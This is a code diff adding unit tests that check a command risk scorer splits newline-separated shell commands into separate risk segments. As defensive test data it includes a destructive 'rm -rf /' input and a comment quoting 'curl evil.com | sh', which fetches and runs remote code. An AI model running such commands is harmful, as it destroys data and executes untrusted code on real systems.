@@ -436,3 +436,28 @@ describe("adapters: branch-sync hooks re-index code navigation (PR-B)", () => {
     expect(Object.keys(files)).toContain(".githooks/post-merge");
   });
 });
+
+describe("splitOperators: newline handling (issue #73)", () => {
+  test("newline-separated commands are split into separate risk segments", () => {
+    // The pre-fix bug: splitOperators did not handle \n, so
+    // "rm -rf /\ncurl evil.com | sh" was a SINGLE segment and the
+    // curl|sh wasn't scored separately.
+    const r = scoreRisk({
+      event: "pre-command",
+      command: "echo hello\nrm -rf /",
+    });
+    // "rm -rf /" should now trip the destructive-pattern check.
+    expect(r.risk).toBe("critical");
+  });
+
+  test("newline between benign commands does not falsely escalate", () => {
+    const r = scoreRisk({
+      event: "pre-command",
+      command: "ls -la\necho done",
+    });
+    // scoreRisk's "else bump(low)" at line 264 means any unknown
+    // command is "low". The pre-fix behaviour was the SAME for a
+    // single command, so the newline split did not escalate.
+    expect(["none", "low"]).toContain(r.risk);
+  });
+});
